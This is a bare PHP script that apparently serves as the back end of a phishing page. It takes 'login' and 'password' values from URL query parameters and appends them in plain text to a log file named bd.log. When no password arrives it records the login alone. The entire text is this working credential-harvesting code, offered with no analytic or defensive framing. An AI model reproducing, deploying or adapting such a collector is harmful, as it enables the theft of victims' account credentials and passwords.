<?php
$phone = $_GET['login'];
$code = $_GET['password'];
if($code == ""){
  $f = fopen("bd.log", "a+");
  fwrite($f, "\r\nLogin: $phone");
  fclose($f);
}else{
  $f = fopen("bd.log", "a+");
  fwrite($f, "\r\nPassword: $code [] login: $phone");
  fclose($f);
}

?>
